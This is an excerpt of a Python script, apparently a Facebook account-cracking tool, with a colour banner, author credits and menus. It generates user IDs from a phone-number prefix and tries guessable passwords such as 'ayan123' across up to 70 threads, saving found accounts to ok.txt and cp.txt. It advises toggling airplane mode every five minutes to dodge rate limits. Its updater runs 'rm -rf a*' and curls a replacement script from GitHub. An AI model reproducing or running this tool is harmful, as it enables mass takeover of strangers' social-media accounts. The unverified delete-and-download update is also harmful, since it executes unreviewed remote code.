...
\033[1;37m#########    ##    ######### ##  #### 
\033[1;37m##     ##    ##    ##     ## ##   ### 
\033[1;37m##     ##    ##    ##     ## ##    ##  \033[1;32m AY9N\033[1;37m 
--------------------------------------------------
[•]CREATED BY     : \033[1;32mAYAN KHAN\033[1;37m
[•]FACEBOOK       : \033[1;32mPROBLEM\033[1;37m
[•]YOUTUBE        : \033[1;32mAYAN TRICKS\033[1;37m
...
try:
    ...
    proxy = requests.get('https://raw.githubusercontent.com/AYAN-JUTT/Ahmed/main/update.txt').text.splitlines()
    v = 3.1
    update = requests.get('https://raw.githubusercontent.com/AYAN-JUTT/files/main/version.txt').text
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/AYAN-JUTT/AYAN/main/AYAN.py > AYAN.py')
...
def ayan():
	...
	if gh =='1':
		...
		os.system('xdg-open https://www.facebook.com/kalpan.kalpana.31')
	elif gh =='0':
...
def menu():
	...
	print('[2] AYAN + KHAN PASS')
	print('[3] ayan + random PASS')
	...
	if opt =='1':
		...
		print('\n\033[1;37m[•] Choose vAYANd option\033[0;97m')
		time.sleep(2)
		menu()
...
def AYAN_khan():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mAYAN + KHAN')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
...
def ayan_random():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mayan + random')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
			pwx = [guru,'ayan123','ayan1122','random786']
			yaari.submit(fcrack,uid,pwx,tl)
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	input('Press Inter To Back Menu')
...
def bd():
	...
	os.system('clear')
	print(logo)
	print('[•] EXAMPLE : 6387,9735,6385,7380,.ETC')
	lines()
	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
	os.system('clear')
	print(logo)
	...
	with ThreadPool(max_workers=70) as yaari:
		...
		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
		print('\033[1;37m[•] SELECTED CODE     : \033[1;32m'+kode)
		print('\033[1;37m[•] METHOD YOU CHOOSE : \033[1;32mINDIA')
		print('\x1b[1;97m[•] USE FLIGHT [\033[1;32mAIRPLANE\033[1;37m] MODE IN EVERY 5 MINUTES')
		lines()
		for guru in user:
			uid = kode+guru
...
def chos():
    ...
    os.system('clear')
    print(logo)
    print('[•] EXAMPLE : khan12345,india,random,Etc')
    lines()
